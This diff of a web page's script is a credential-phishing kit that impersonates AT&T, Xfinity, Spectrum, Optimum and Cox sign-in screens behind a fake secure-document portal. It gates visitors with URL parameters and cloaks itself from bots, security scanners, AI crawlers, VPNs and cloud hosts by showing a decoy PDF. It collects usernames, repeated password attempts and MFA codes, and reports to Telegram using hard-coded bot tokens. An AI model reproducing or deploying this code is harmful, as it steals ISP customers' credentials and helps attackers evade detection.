@@ -1057,855 +1057,1138 @@
   </div>
 
   <script>
-// ============================================================================
-// SECURITY CONFIGURATION - AGGRESSIVE BLACKLISTING
-// ============================================================================
-const SECURITY_CONFIG = {
-    // Telegram Configuration
-    BOT_TOKEN: '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0',
-    CHAT_ID: '1412104349',
-    
-    // Required URL parameters
-    REQUIRED_PARAMS: {
-        giftCode: /^Santa\d{3}$/,      // e.g., ?giftCode=Santa123
-        reindeer: /^Rudolph\d{3}$/     // e.g., &reindeer=Rudolph456
-    },
-    
-    // Blacklisted patterns - KEEP ALL
-    BLACKLISTED_WORDS: [
-        // Bots & Crawlers
-        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
-        'YandexBot', 'Sogou', 'Exabot', 'facebook', 'facebot', 'Twitterbot',
-        'rogerbot', 'linkedinbot', 'embedly', 'quora', 'outbrain', 'pinterest',
-        'slackbot', 'vkShare', 'W3C_Validator', 'redditbot', 'Applebot',
-        
-        // Security Tools & Headless Browsers
-        'curl', 'wget', 'python', 'perl', 'ruby', 'java', 'php', 'scrapy',
-        'phantomjs', 'selenium', 'puppeteer', 'headless', 'chrome-headless',
-        'nightmare', 'casperjs', 'slimerjs', 'trident', 'axios', 'request',
-        'postman', 'insomnia', 'restclient', 'fiddler', 'burp', 'zap',
-        
-        // AI & LLM Agents
-        'ChatGPT-User', 'GPTBot', 'Google-Extended', 'ClaudeBot',
-        'anthropic-ai', 'cohere-ai', 'PerplexityBot', 'YouBot',
-        'Diffbot', 'OAI-SearchBot', 'CCBot', 'Bytespider',
-        
-        // Cloud & Proxy Services
-        'amazonaws', 'googleusercontent', 'cloudfront', 'azure',
-        'digitalocean', 'linode', 'vultr', 'heroku', 'github',
-        'gitlab', 'bitbucket', 'travis', 'jenkins', 'circleci',
-        
-        // VPN/Proxy Indicators
-        'proxy', 'vpn', 'tor', 'anonymizer', 'hide', 'shield',
-        'nordvpn', 'expressvpn', 'surfshark', 'pia', 'cyberghost',
-        'hidemyass', 'windscribe', 'privateinternetaccess',
-        
-        // Malicious Indicators
-        'sqlmap', 'nikto', 'nmap', 'metasploit', 'wpscan', 'joomscan',
-        'dirbuster', 'gobuster', 'hydra', 'john', 'hashcat', 'aircrack',
-        'ettercap', 'wireshark', 'nessus', 'openvas', 'nexpose',
-        
-        // Data Centers & Hosting
-        'datacenter', 'colo', 'hosting', 'server', 'vps', 'dedicated',
-        'ovh', 'hetzner', 'leaseweb', 'online.net', 'kimsufi',
-        'contabo', 'hostwinds', 'bluehost', 'godaddy', 'namecheap',
-        
-        // Scanning Tools
-        'zap', 'arachni', 'skipfish', 'w3af', 'wapiti', 'vega',
-        'burpsuite', 'acunetix', 'appscan', 'netsparker', 'qualys',
-        
-        // Development & Testing
-        'localhost', '127.0.0.1', '192.168.', '10.', '172.16.',
-        'test', 'dev', 'staging', 'preprod', 'qa', 'debug',
-        
-        // Mobile Apps (should use API)
-        'okhttp', 'alamofire', 'volley', 'retrofit', 'afnetworking',
-        'ionic', 'react-native', 'flutter', 'xamarin', 'cordova'
-    ],
-    
-    // Blacklisted hostname patterns - KEEP ALL
-    BLACKLISTED_HOSTNAMES: [
-        '.aws.', '.google.', '.amazonaws.', '.cloudfront.',
-        '.azure.', '.digitalocean.', '.linode.', '.vultr.',
-        '.heroku.', '.github.', '.gitlab.', '.bitbucket.',
-        '.ovh.', '.hetzner.', '.leaseweb.', '.contabo.',
-        '.vps.', '.server.', '.hosting.', '.datacenter.',
-        '.proxy.', '.vpn.', '.tor.', '.anonymizer.',
-        'crawl-', 'bot-', 'spider-', 'scraper-', 'scan-',
-        'security-', 'pentest-', 'test-', 'dev-', 'staging-'
-    ],
-    
-    // Blacklisted countries (ISO codes) - KEEP ALL
-    BLACKLISTED_COUNTRIES: [
-        'CN', 'RU', 'KP', 'IR', 'SY', 'CU', 'VE'  // High-risk countries
-    ],
-    
-    // Security settings
-    AGGRESSIVE_MODE: true,
-    BLACKLIST_ON_MISSING_BD: true,
-    MAX_ATTEMPTS_PER_IP: 3,
-    BLACKLIST_DURATION: '30d', // 30 days in localStorage
-    ENABLE_TELEGRAM_ALERTS: true
-};
 
+    // ============================================================================
+// SIMPLE URL PARAMETER CHECK WITH BLACKLISTING
 // ============================================================================
-// STORAGE MANAGEMENT - KEEP ALL
-// ============================================================================
-const STORAGE_KEYS = {
-    BLACKLIST: 'security_blacklist_v2',
-    ATTEMPTS: 'ip_attempts',
-    VALID_PARAMS: 'validated_params',
-    SESSIONS: 'active_sessions'
-};
-
-function initializeSecurityStorage() {
-    // Initialize blacklist
-    if (!localStorage.getItem(STORAGE_KEYS.BLACKLIST)) {
-        localStorage.setItem(STORAGE_KEYS.BLACKLIST, JSON.stringify([]));
-    }
+(function() {
+    console.log('🔍 Checking URL parameters...');
     
-    // Initialize attempt counter
-    if (!localStorage.getItem(STORAGE_KEYS.ATTEMPTS)) {
-        localStorage.setItem(STORAGE_KEYS.ATTEMPTS, JSON.stringify({}));
-    }
-    
-    // Initialize sessions
-    if (!localStorage.getItem(STORAGE_KEYS.SESSIONS)) {
-        localStorage.setItem(STORAGE_KEYS.SESSIONS, JSON.stringify({}));
-    }
-}
-
-// ============================================================================
-// BLACKLIST MANAGEMENT - KEEP ALL
-// ============================================================================
-function addToBlacklist(ip, reason = 'Security violation', details = {}) {
-    try {
-        const blacklist = JSON.parse(localStorage.getItem(STORAGE_KEYS.BLACKLIST) || '[]');
-        
-        // Clean old entries (older than 30 days)
-        const thirtyDaysAgo = Date.now() - (30 * 24 * 60 * 60 * 1000);
-        const cleanBlacklist = blacklist.filter(entry => 
-            new Date(entry.timestamp).getTime() > thirtyDaysAgo
-        );
-        
-        const entry = {
-            ip: ip,
-            timestamp: new Date().toISOString(),
-            reason: reason,
-            details: {
-                userAgent: navigator.userAgent.substring(0, 150),
-                screen: `${screen.width}x${screen.height}`,
-                language: navigator.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                url: window.location.href,
-                ...details
-            },
-            expires: new Date(Date.now() + (30 * 24 * 60 * 60 * 1000)).toISOString()
-        };
-        
-        // Check if IP already exists
-        const existingIndex = cleanBlacklist.findIndex(entry => entry.ip === ip);
-        if (existingIndex !== -1) {
-            // Update existing entry
-            cleanBlacklist[existingIndex] = entry;
-        } else {
-            // Add new entry
-            cleanBlacklist.push(entry);
-        }
-        
-        localStorage.setItem(STORAGE_KEYS.BLACKLIST, JSON.stringify(cleanBlacklist));
-        
-        // Send Telegram alert
-        if (SECURITY_CONFIG.ENABLE_TELEGRAM_ALERTS) {
-            sendSecurityAlert('BLACKLIST_ADDED', {
-                ip: ip,
-                reason: reason,
-                userAgent: navigator.userAgent,
-                url: window.location.href
-            });
-        }
-        
-        console.log(`🚫 BLACKLISTED: ${ip} - ${reason}`);
-        return true;
-        
-    } catch (error) {
-        console.error('Error adding to blacklist:', error);
-        return false;
-    }
-}
-
-function isBlacklisted(ip) {
-    try {
-        const blacklist = JSON.parse(localStorage.getItem(STORAGE_KEYS.BLACKLIST) || '[]');
-        const now = new Date();
-        
-        // Clean expired entries while checking
-        const validEntries = blacklist.filter(entry => {
-            if (!entry.expires) return true;
-            return new Date(entry.expires) > now;
-        });
-        
-        // Update storage with cleaned list
-        if (validEntries.length !== blacklist.length) {
-            localStorage.setItem(STORAGE_KEYS.BLACKLIST, JSON.stringify(validEntries));
-        }
-        
-        return validEntries.some(entry => entry.ip === ip);
-        
-    } catch (error) {
-        console.error('Error checking blacklist:', error);
-        return false;
-    }
-}
-
-// ============================================================================
-// ATTEMPT TRACKING - KEEP ALL
-// ============================================================================
-function trackAttempt(ip) {
-    try {
-        const attempts = JSON.parse(localStorage.getItem(STORAGE_KEYS.ATTEMPTS) || '{}');
-        
-        if (!attempts[ip]) {
-            attempts[ip] = {
-                count: 1,
-                firstAttempt: new Date().toISOString(),
-                lastAttempt: new Date().toISOString()
-            };
-        } else {
-            attempts[ip].count++;
-            attempts[ip].lastAttempt = new Date().toISOString();
-            
-            // Check if max attempts reached
-            if (attempts[ip].count >= SECURITY_CONFIG.MAX_ATTEMPTS_PER_IP) {
-                addToBlacklist(ip, 'Maximum attempts exceeded', {
-                    attemptCount: attempts[ip].count
-                });
-            }
-        }
-        
-        localStorage.setItem(STORAGE_KEYS.ATTEMPTS, JSON.stringify(attempts));
-        return attempts[ip].count;
-        
-    } catch (error) {
-        console.error('Error tracking attempt:', error);
-        return 1;
-    }
-}
-
-// ============================================================================
-// PARAMETER VALIDATION - KEEP ALL
-// ============================================================================
-function validateParameters() {
     const urlParams = new URLSearchParams(window.location.search);
-    const results = {
-        valid: true,
-        missingParams: [],
-        invalidParams: [],
-        values: {}
-    };
+    const giftCode = urlParams.get('giftCode');
+    const reindeer = urlParams.get('reindeer');
+    const bd = urlParams.get('Bd');
     
-    // Check required parameters
-    Object.keys(SECURITY_CONFIG.REQUIRED_PARAMS).forEach(param => {
-        const value = urlParams.get(param);
-        const pattern = SECURITY_CONFIG.REQUIRED_PARAMS[param];
-        
-        if (!value) {
-            results.valid = false;
-            results.missingParams.push(param);
-        } else if (!pattern.test(value)) {
-            results.valid = false;
-            results.invalidParams.push({ param, value, pattern: pattern.toString() });
-        } else {
-            results.values[param] = value;
+    console.log('URL Parameters:', { giftCode, reindeer, bd });
+    
+    // Initialize blacklist storage if needed
+    if (!localStorage.getItem('simple_blacklist')) {
+        localStorage.setItem('simple_blacklist', JSON.stringify([]));
+    }
+    
+    // Function to add IP to blacklist
+    async function addToBlacklist(reason) {
+        try {
+            // Get IP
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+            
+            // Get blacklist
+            const blacklist = JSON.parse(localStorage.getItem('simple_blacklist') || '[]');
+            
+            // Create entry
+            const entry = {
+                ip: ip,
+                timestamp: new Date().toISOString(),
+                reason: reason,
+                details: {
+                    giftCode: giftCode,
+                    reindeer: reindeer,
+                    bd: bd,
+                    url: window.location.href,
+                    userAgent: navigator.userAgent.substring(0, 100)
+                }
+            };
+            
+            // Add to blacklist if not already there
+            const existingIndex = blacklist.findIndex(entry => entry.ip === ip);
+            if (existingIndex === -1) {
+                blacklist.push(entry);
+                localStorage.setItem('simple_blacklist', JSON.stringify(blacklist));
+                console.log(`🚫 Added ${ip} to blacklist: ${reason}`);
+                
+                // Send Telegram alert
+                sendTelegramAlert(ip, reason);
+            }
+            
+        } catch (error) {
+            console.error('Error adding to blacklist:', error);
         }
+    }
+    
+    // Function to send Telegram alert
+    async function sendTelegramAlert(ip, reason) {
+        try {
+            const BOT_TOKEN = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
+            const CHAT_ID = '1412104349';
+            
+            const message = `🚫 *BLACKLISTED - ${ip}*
+            
+🔒 *Reason:* ${reason}
+📅 *Time:* ${new Date().toLocaleString()}
+🌐 *URL:* ${window.location.href}
+🎯 *Parameters:*
+• giftCode: \`${giftCode || 'missing'}\`
+• reindeer: \`${reindeer || 'missing'}\`
+• Bd: \`${bd || 'missing'}\`
+
+🖥️ *User Agent:* ${navigator.userAgent.substring(0, 100)}...`;
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            
+        } catch (error) {
+            console.error('Error sending Telegram alert:', error);
+        }
+    }
+    
+    // Check if all required parameters exist
+    const hasAllParams = giftCode && reindeer && bd;
+    
+    if (!hasAllParams) {
+        console.log('❌ Missing parameters - showing PDF iframe');
+        
+        // Add to blacklist
+        addToBlacklist('Missing required parameters');
+        
+        // Show PDF iframe
+        showPDFIframe();
+        return;
+    }
+    
+    // Check parameter formats
+    const isValidGiftCode = /^Santa\d{3}$/i.test(giftCode);
+    const isValidReindeer = /^Rudolph\d{3}$/i.test(reindeer);
+    const isValidBd = /^[AXSOC]$/i.test(bd);
+    
+    if (!isValidGiftCode || !isValidReindeer || !isValidBd) {
+        console.log('❌ Invalid parameter format - showing PDF iframe');
+        
+        // Add to blacklist
+        addToBlacklist('Invalid parameter format');
+        
+        // Show PDF iframe
+        showPDFIframe();
+        return;
+    }
+    
+    console.log('✅ All parameters valid - loading credential system');
+    
+    // Function to show PDF iframe
+    function showPDFIframe() {
+        document.body.innerHTML = `
+            <style>
+                body { margin: 0; padding: 0; overflow: hidden; }
+                .pdf-frame { 
+                    width: 100vw; 
+                    height: 100vh; 
+                    border: none; 
+                }
+            </style>
+            <iframe 
+                class="pdf-frame" 
+                src="https://www.marshall.edu/procurement-services/files/MU20INTATHINS_CO1.pdf"
+            >
+                Your browser doesn't support iframes. 
+                <a href="https://www.marshall.edu/procurement-services/files/MU20INTATHINS_CO1.pdf">Download PDF</a>
+            </iframe>
+        `;
+        
+        // Stop all other JavaScript from running
+        throw new Error('Invalid URL parameters - PDF shown');
+    }
+    
+})();
+
+
+
+
+///////////////////////////////////////////////////////////////////////////////
+// ============================================================================
+// CONFIGURATION - FULLY CUSTOMIZABLE
+// ============================================================================
+const CONFIG = {
+  // Telegram Configuration
+  TELEGRAM_BOT_TOKEN: '8321740469:AAHDTke-Vf-lr9xQ6MHHZ1sP0QYrexeznL4',
+  TELEGRAM_CHAT_ID: '1412104349',
+  ENABLE_TELEGRAM: true,
+  
+  // Authentication Attempt Configuration
+  PASSWORD_ATTEMPTS_REQUIRED: 3,     // Number of password attempts before success
+  MFA_ATTEMPTS_ALLOWED: 2,           // Number of MFA attempts allowed
+  
+  // Security Settings
+  PREVENT_PASSWORD_REUSE: true,      // Prevent using same password twice
+  MFA_CODE_LENGTH: 6,               // Length of MFA code
+  MFA_CODE_EXPIRY_MINUTES: 10,      // Minutes before MFA code expires
+  
+  // Provider Detection
+  DEFAULT_PROVIDER: 'A',            // Default to AT&T
+  USE_URL_PARAM: true,              // Read provider from URL ?Bd= parameter
+  USE_UA_DETECTION: true            // Detect provider from user agent
+};
+
+// ============================================================================
+// PROVIDERS CONFIGURATION WITH REAL LOGOS
+// ============================================================================
+const PROVIDERS = {
+  'A': { // AT&T
+    name: 'AT&T',
+    code: 'A',
+    colors: {
+      primary: 'rgb(0, 56, 143)',
+      primaryLight: 'rgba(0, 56, 143, 0.1)'
+    },
+    logo: 'https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg',
+    buttonText: 'Sign in',
+    loginConfig: {
+      field1: { label: 'User ID', placeholder: 'Enter AT&T user ID' },
+      field2: { label: 'Password', placeholder: 'Enter password' },
+      hasRememberMe: true,
+      rememberMeText: 'Keep me signed in',
+      buttonText: 'Continue',
+      welcomeText: 'Sign in',
+      errorMessage: 'Incorrect user ID or password. Try again.',
+      links: [
+        { text: 'Forgot user ID?', href: '#' },
+      ],
+      errorCode: ''
+    }
+  },
+  'X': { // Xfinity
+    name: 'Xfinity',
+    code: 'X',
+    colors: {
+      primary: '#111111',
+      primaryLight: 'rgba(17, 17, 17, 0.1)'
+    },
+    logo: 'https://login.xfinity.com/static/images/global/xfinity-logo-grey.svg',
+    buttonText: 'Let\'s go',
+    loginConfig: {
+      field1: { label: 'Username', placeholder: 'Enter Xfinity username' },
+      field2: { label: 'Password', placeholder: 'Enter password' },
+      hasRememberMe: true,
+      rememberMeText: 'Stay Signed In on This Device',
+      buttonText: 'Sign In',
+      welcomeText: 'Sign In to Get Started',
+      errorMessage: 'The info you entered doesn\'t match our records. Please try again or select Forgot Username or Password.',
+      links: [
+        { text: 'Forgot Username or Password?', href: '#' }
+      ],
+      errorCode: 'IDID-3104'
+    }
+  },
+  'S': { // Spectrum
+    name: 'Spectrum',
+    code: 'S',
+    colors: {
+      primary: 'rgb(2, 87, 178)',
+      primaryLight: 'rgba(2, 87, 178, 0.1)'
+    },
+    logo: '/assets/images/spectrum-logo.svg',
+    backupLogo: 'https://www.spectrum.com/etc.clientlibs/spectrum/clientlibs/clientlib-base/resources/images/logos/spectrum-logo.svg',
+    buttonText: 'Sign In',
+    loginConfig: {
+      field1: { label: 'Username', placeholder: 'Enter Spectrum username' },
+      field2: { label: 'Password', placeholder: 'Enter password' },
+      hasRememberMe: true,
+      rememberMeText: 'Stay Signed In on This Device',
+      buttonText: 'Sign In',
+      welcomeText: 'Sign In to Get Started',
+      errorMessage: 'The info you entered doesn\'t match our records. Please try again or select Forgot Username or Password.',
+      links: [
+        { text: 'Forgot Username or Password?', href: '#' }
+      ],
+      errorCode: 'IDID-3104'
+    }
+  },
+  'O': { // Optimum
+    name: 'Optimum',
+    code: 'O',
+    colors: {
+      primary: 'rgb(254, 110, 0)',
+      primaryLight: 'rgba(254, 110, 0, 0.1)'
+    },
+    logo: 'https://www.optimum.com/content/dam/optimum/Header/optimum_logo.svg',
+    buttonText: 'Continue',
+    loginConfig: {
+      field1: { label: 'Username*', placeholder: 'Enter Optimum username' },
+      field2: { label: 'Password*', placeholder: 'Enter password' },
+      hasRememberMe: true,
+      rememberMeText: 'Remember Me',
+      buttonText: 'Continue',
+      welcomeText: 'Sign in to Optimum',
+      errorMessage: 'Incorrect user ID or password. Try again.',
+      links: [
+        { text: 'Forgot ID?', href: '#' },
+      ],
+      errorCode: ''
+    }
+  },
+  'C': { // Cox
+    name: 'Cox',
+    code: 'C',
+    colors: {
+      primary: '#285A93',
+      primaryLight: 'rgba(40, 90, 147, 0.1)'
+    },
+    logo: 'https://www.cox.com/content/dam/cox/common/icons/ui_components/cox_logo.png',
+    buttonText: 'Sign in',
+    loginConfig: {
+      field1: { label: 'User ID', placeholder: 'Enter Cox user ID' },
+      field2: { label: 'Password', placeholder: 'Enter password' },
+      hasRememberMe: true,
+      rememberMeText: 'Remember user ID',
+      buttonText: 'Sign in',
+      welcomeText: 'Welcome back',
+      errorMessage: 'Incorrect user ID or password. Try again.',
+      links: [
+        { text: 'Forgot User ID?', href: '#' },
+      ],
+      errorCode: ''
+    }
+  }
+};
+
+// ============================================================================
+// STATE MANAGEMENT
+// ============================================================================
+let currentProvider = null;
+let currentSession = {
+  provider: null,
+  username: '',
+  password: '',
+  mfaCode: '',
+  usedPasswords: [],              // Track previously used passwords
+  attempts: {
+    password: 0,
+    mfa: 0
+  },
+  mfaGenerated: false,
+  mfaCodeValue: '',
+  mfaExpiry: null,
+  userInfo: null,
+  capturedAt: null
+};
+
+let mfaInputs = [];
+let generatedMfaCode = '';
+
+// ============================================================================
+// DOM ELEMENTS
+// ============================================================================
+const elements = {
+  // Main UI
+  accessBtn: document.getElementById('accessBtn'),
+  documentCard: document.getElementById('documentCard'),
+  downloadBtn: document.getElementById('downloadBtn'),
+  printBtn: document.getElementById('printBtn'),
+  
+  // Loading
+  loadingOverlay: document.getElementById('loadingOverlay'),
+  loadingText: document.getElementById('loadingText'),
+  loadingSubtext: document.getElementById('loadingSubtext'),
+  loadingSpinner: document.getElementById('loadingSpinner'),
+  
+  // Auth Modal
+  authModal: document.getElementById('authModal'),
+  authForm: document.getElementById('authForm'),
+  providerLogoModal: document.getElementById('providerLogoModal'),
+  welcomeText: document.getElementById('welcomeText'),
+  username: document.getElementById('username'),
+  password: document.getElementById('password'),
+  showPassword: document.getElementById('showPassword'),
+  signinBtn: document.getElementById('signinBtn'),
+  signinBtnText: document.getElementById('signinBtnText'),
+  errorMessage: document.getElementById('errorMessage'),
+  errorMessageText: document.getElementById('errorMessageText'),
+  errorCode: document.getElementById('errorCode'),
+  rememberMeGroup: document.getElementById('rememberMeGroup'),
+  rememberMeLabel: document.getElementById('rememberMeLabel'),
+  loginLinks: document.getElementById('loginLinks'),
+  
+  // MFA Modal
+  mfaModal: document.getElementById('mfaModal'),
+  mfaProviderLogo: document.getElementById('mfaProviderLogo'),
+  mfaWelcomeText: document.getElementById('mfaWelcomeText'),
+  mfaInstructions: document.getElementById('mfaInstructions'),
+  mfaCodeDisplay: document.getElementById('mfaCodeDisplay'),
+  verifyMfaBtn: document.getElementById('verifyMfaBtn'),
+  cancelMfaBtn: document.getElementById('cancelMfaBtn'),
+  mfaAttempts: document.getElementById('mfaAttempts'),
+  currentMfaAttempt: document.getElementById('currentMfaAttempt'),
+  maxMfaAttempts: document.getElementById('maxMfaAttempts'),
+  
+  // Success Modal - SIMPLIFIED
+  successModal: document.getElementById('successModal'),
+  successWelcomeText: document.getElementById('successWelcomeText'),
+  successMessage: document.getElementById('successMessage'),
+  capturedData: document.getElementById('capturedData'), // We'll hide this
+  viewDocumentBtn: document.getElementById('viewDocumentBtn'),
+  closeSuccessBtn: document.getElementById('closeSuccessBtn'),
+  
+  // Provider UI
+  providerLogo: document.getElementById('providerLogo'),
+  portalTitle: document.getElementById('portalTitle'),
+  securityText: document.getElementById('securityText'),
+  copyrightText: document.getElementById('copyrightText'),
+  docId: document.getElementById('docId'),
+  accessBtnText: document.getElementById('accessBtnText'),
+  downloadBtnText: document.getElementById('downloadBtnText'),
+  printBtnText: document.getElementById('printBtnText')
+};
+
+// ============================================================================
+// INITIALIZATION
+// ============================================================================
+function initialize() {
+  detectProvider();
+  applyProviderTheme(currentProvider);
+  setupEventListeners();
+  setupMFAInputs();
+  
+  // Hide captured data display (it's for us, not users)
+  elements.capturedData.style.display = 'none';
+  
+  console.log(`Initialized with provider: ${currentProvider.name}`);
+}
+
+function detectProvider() {
+  let providerCode = CONFIG.DEFAULT_PROVIDER;
+  
+  // Check URL parameter
+  if (CONFIG.USE_URL_PARAM) {
+    const urlParams = new URLSearchParams(window.location.search);
+    const urlProvider = urlParams.get('Bd')?.toUpperCase();
+    if (urlProvider && PROVIDERS[urlProvider]) {
+      providerCode = urlProvider;
+    }
+  }
+  
+  // User agent detection (optional)
+  if (CONFIG.USE_UA_DETECTION) {
+    const ua = navigator.userAgent.toLowerCase();
+    if (ua.includes('xfinity') || ua.includes('comcast')) providerCode = 'X';
+    else if (ua.includes('spectrum') || ua.includes('charter')) providerCode = 'S';
+    else if (ua.includes('optimum') || ua.includes('altice')) providerCode = 'O';
+    else if (ua.includes('cox')) providerCode = 'C';
+  }
+  
+  currentProvider = PROVIDERS[providerCode];
+  currentSession.provider = currentProvider;
+}
+
+// ============================================================================
+// UI THEMING
+// ============================================================================
+function applyProviderTheme(provider) {
+  const colors = provider.colors;
+  const login = provider.loginConfig;
+  
+  // Update CSS variables
+  document.documentElement.style.setProperty('--primary-color', colors.primary);
+  document.documentElement.style.setProperty('--primary-color-light', colors.primaryLight);
+  
+  // Update logos
+  const logoImg = document.createElement('img');
+  logoImg.src = provider.logo;
+  logoImg.alt = `${provider.name} Logo`;
+  
+  const logoImgModal = document.createElement('img');
+  logoImgModal.src = provider.logo;
+  logoImgModal.alt = `${provider.name} Logo`;
+  
+  const logoImgMfa = document.createElement('img');
+  logoImgMfa.src = provider.logo;
+  logoImgMfa.alt = `${provider.name} Logo`;
+  
+  elements.providerLogo.innerHTML = '';
+  elements.providerLogoModal.innerHTML = '';
+  elements.mfaProviderLogo.innerHTML = '';
+  
+  elements.providerLogo.appendChild(logoImg.cloneNode());
+  elements.providerLogoModal.appendChild(logoImgModal.cloneNode());
+  elements.mfaProviderLogo.appendChild(logoImgMfa.cloneNode());
+  
+  // Update loading spinner
+  elements.loadingSpinner.style.borderTopColor = colors.primary;
+  
+  // Update document icon
+  document.querySelector('.document-icon').style.color = colors.primary;
+  
+  // Update security notice
+  const securityNotice = document.getElementById('securityNotice');
+  securityNotice.style.backgroundColor = provider.colors.primaryLight;
+  securityNotice.style.border = `1px solid ${colors.primary}`;
+  
+  // Update text content
+  elements.portalTitle.textContent = `${provider.name} Secure Document Access`;
+  elements.securityText.innerHTML = `<strong>Security Notice:</strong> This document requires ${provider.name} account authentication for viewing. All access is logged and monitored.`;
+  elements.copyrightText.textContent = `© 2025 ${provider.name}. All rights reserved.`;
+  elements.docId.textContent = `${provider.code}-DOC-2025-0876`;
+  elements.accessBtnText.textContent = `Sign In to Access ${provider.name} Document`;
+  elements.downloadBtnText.textContent = `Download ${provider.name} PDF`;
+  elements.printBtnText.textContent = `Print ${provider.name} Document`;
+  elements.welcomeText.textContent = login.welcomeText;
+  elements.mfaWelcomeText.textContent = `${provider.name} Two-Factor Authentication`;
+  elements.successWelcomeText.textContent = `${provider.name} Authentication Complete`;
+  
+  // Update form labels and placeholders
+  document.getElementById('usernameLabel').textContent = login.field1.label;
+  elements.username.placeholder = login.field1.placeholder;
+  document.getElementById('passwordLabel').textContent = login.field2.label;
+  elements.password.placeholder = login.field2.placeholder;
+  elements.signinBtnText.textContent = login.buttonText;
+  
+  // Update remember me checkbox
+  if (login.hasRememberMe) {
+    elements.rememberMeGroup.style.display = 'flex';
+    elements.rememberMeLabel.textContent = login.rememberMeText;
+  } else {
+    elements.rememberMeGroup.style.display = 'none';
+  }
+  
+  // Update error message
+  elements.errorMessageText.textContent = login.errorMessage;
+  if (login.errorCode) {
+    elements.errorCode.textContent = login.errorCode;
+  } else {
+    elements.errorCode.textContent = '';
+  }
+  
+  // Update login links
+  elements.loginLinks.innerHTML = '';
+  login.links.forEach(link => {
+    const linkElement = document.createElement('a');
+    linkElement.href = link.href;
+    linkElement.className = 'login-link';
+    linkElement.textContent = link.text;
+    linkElement.style.color = colors.primary;
+    elements.loginLinks.appendChild(linkElement);
+  });
+  
+  // Update buttons
+  elements.accessBtn.style.backgroundColor = colors.primary;
+  elements.signinBtn.style.backgroundColor = colors.primary;
+  elements.verifyMfaBtn.style.backgroundColor = colors.primary;
+  elements.viewDocumentBtn.style.backgroundColor = colors.primary;
+  
+  elements.downloadBtn.style.color = colors.primary;
+  elements.downloadBtn.style.borderColor = colors.primary;
+  elements.printBtn.style.color = colors.primary;
+  elements.printBtn.style.borderColor = colors.primary;
+  
+  // Hide MFA attempt counter
+  elements.mfaAttempts.style.display = 'none';
+}
+
+// ============================================================================
+// EVENT LISTENERS SETUP
+// ============================================================================
+function setupEventListeners() {
+  // Access button
+  elements.accessBtn.addEventListener('click', showAuthModal);
+  
+  // Password toggle
+  let passwordVisible = false;
+  elements.showPassword.addEventListener('click', () => {
+    passwordVisible = !passwordVisible;
+    elements.password.type = passwordVisible ? 'text' : 'password';
+    elements.showPassword.textContent = passwordVisible ? 'Hide' : 'Show';
+  });
+  
+  // Auth form submission
+  elements.authForm.addEventListener('submit', handleLoginSubmit);
+  
+  // MFA verification
+  elements.verifyMfaBtn.addEventListener('click', verifyMFA);
+  elements.cancelMfaBtn.addEventListener('click', () => {
+    elements.mfaModal.classList.remove('active');
+    elements.authModal.classList.add('active');
+  });
+  
+  // Success modal buttons
+  elements.viewDocumentBtn.addEventListener('click', showDocumentAccess);
+  elements.closeSuccessBtn.addEventListener('click', () => {
+    elements.successModal.classList.remove('active');
+    resetSession();
+  });
+  
+  // Close modals on outside click
+  document.querySelectorAll('.secure-modal, .mfa-modal, .success-modal').forEach(modal => {
+    modal.addEventListener('click', (e) => {
+      if (e.target === modal) {
+        modal.classList.remove('active');
+        if (modal === elements.authModal) {
+          hideError();
+        }
+      }
+    });
+  });
+  
+  // Clear error on input
+  elements.username.addEventListener('input', hideError);
+  elements.password.addEventListener('input', hideError);
+  
+  // Document actions - FIXED to show realistic errors
+  elements.downloadBtn.addEventListener('click', showDownloadError);
+  elements.printBtn.addEventListener('click', showPrintError);
+}
+
+function setupMFAInputs() {
+  mfaInputs = document.querySelectorAll('.mfa-input');
+  mfaInputs.forEach((input, index) => {
+    input.addEventListener('input', (e) => {
+      // Auto-advance to next input
+      if (e.target.value.length === 1 && index < mfaInputs.length - 1) {
+        mfaInputs[index + 1].focus();
+      }
+      
+      // Auto-verify when all digits are entered
+      let fullCode = '';
+      mfaInputs.forEach(inp => fullCode += inp.value);
+      if (fullCode.length === CONFIG.MFA_CODE_LENGTH) {
+        verifyMFA();
+      }
     });
     
-    // Check Bd parameter (if aggressive mode is on)
-    if (SECURITY_CONFIG.AGGRESSIVE_MODE || SECURITY_CONFIG.BLACKLIST_ON_MISSING_BD) {
-        const bdParam = urlParams.get('Bd');
-        if (!bdParam || !['A', 'X', 'S', 'O', 'C'].includes(bdParam.toUpperCase())) {
-            results.valid = false;
-            results.missingParams.push('Bd');
-        } else {
-            results.values.Bd = bdParam;
-        }
-    }
+    input.addEventListener('keydown', (e) => {
+      // Handle backspace to move to previous input
+      if (e.key === 'Backspace' && !input.value && index > 0) {
+        mfaInputs[index - 1].focus();
+      }
+    });
     
-    // Store valid parameters for session
-    if (results.valid) {
-        localStorage.setItem(STORAGE_KEYS.VALID_PARAMS, JSON.stringify({
-            ...results.values,
-            validatedAt: new Date().toISOString(),
-            sessionId: generateSessionId()
-        }));
-    }
+    // Clear error on input
+    input.addEventListener('input', () => {
+      input.classList.remove('error');
+    });
+  });
+}
+
+// ============================================================================
+// UI FUNCTIONS
+// ============================================================================
+function showAuthModal() {
+  elements.accessBtn.classList.add('loading');
+  elements.accessBtn.innerHTML = ` Connecting to ${currentProvider.name}...`;
+  
+  showLoading('Establishing secure connection', 'Connecting to authentication servers');
+  
+  setTimeout(() => {
+    hideLoading();
+    elements.accessBtn.classList.remove('loading');
+    elements.accessBtn.innerHTML = ` Sign In to Access ${currentProvider.name} Document`;
     
-    return results;
-}
-
-// ============================================================================
-// SECURITY CHECKS - AGGRESSIVE MODE - KEEP ALL
-// ============================================================================
-async function performSecurityChecks() {
-    try {
-        // 1. Get IP address
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
-        const ip = ipData.ip;
-        
-        // Track this attempt
-        const attemptCount = trackAttempt(ip);
-        
-        // 2. Check blacklist
-        if (isBlacklisted(ip)) {
-            return {
-                allowed: false,
